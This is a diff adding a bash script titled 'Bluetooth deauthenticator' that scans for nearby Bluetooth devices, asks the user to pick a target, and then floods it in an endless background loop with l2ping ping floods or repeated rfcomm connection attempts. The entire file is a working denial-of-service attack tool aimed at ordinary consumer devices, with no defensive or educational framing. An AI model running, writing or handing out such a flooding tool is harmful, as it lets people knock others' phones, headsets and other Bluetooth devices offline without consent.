@@ -1,0 +1,75 @@
+#!/bin/bash
+
+version="v0.2.0-alpha";
+
+# Function to find devices
+find_devices() {
+    echo "[*] Scanning for Bluetooth devices nearby..."
+    devices=$(hcitool scan | tail -n +2)
+    
+    if [[ -z "$devices" ]]; then
+        echo "[-] No devices found. Make sure Bluetooth is enabled and devices are in discoverable mode."
+        exit 1
+    fi
+
+    echo "[*] Devices found:"
+    IFS=$'\n'
+    device_list=($devices)
+    unset IFS
+
+    for i in "${!device_list[@]}"; do
+        addr=$(echo "${device_list[$i]}" | awk '{print $1}')
+        name=$(echo "${device_list[$i]}" | awk '{print substr($0, index($0,$2))}')
+        echo "$i) $addr - $name"
+    done
+
+    echo -n "[?] Enter the number of the device you want to target: "
+    read device_index
+
+    if ! [[ "$device_index" =~ ^[0-9]+$ ]] || [[ "$device_index" -ge "${#device_list[@]}" ]]; then
+        echo "[-] Invalid selection."
+        exit 1
+    fi
+
+    target_addr=$(echo "${device_list[$device_index]}" | awk '{print $1}')
+    echo "[+] Selected device: $target_addr"
+}
+
+# Main script logic
+find_devices
+
+echo -n "[?] Enter the packet size (e.g., 128): "
+read packet_size
+if ! [[ "$packet_size" =~ ^[0-9]+$ ]]; then
+    echo "[-] Packet size must be a number."
+    exit 1
+fi
+
+echo -e "Attack types:\n"\
+        "\t1) l2ping - Ping flood\n"\
+        "\t2) rfcomm - Connect flood\n"
+
+echo -n "[?] Select the attack type (1 or 2): "
+read attack_type
+
+if [[ "$attack_type" != "1" && "$attack_type" != "2" ]]; then
+    echo "[-] Invalid attack type."
+    exit 1
+fi
+
+echo "Bluetooth deauthenticator $version"
+
+if [[ "$attack_type" == 1 ]]; then
+    cmd="l2ping -i hci0 -s $packet_size -f $target_addr"
+elif [[ "$attack_type" == 2 ]]; then
+    cmd="rfcomm connect $target_addr 1 2>&1 >/dev/null"
+fi
+
+echo "[*] Starting attack on $target_addr -- Packet size: $packet_size -- Attack type: $attack_type"
+
+while true; do
+    echo "[+] Packet sent to $target_addr -- Packet size: $packet_size -- Attack type: $attack_type"
+    $cmd &
+    sleep .200
+done
+
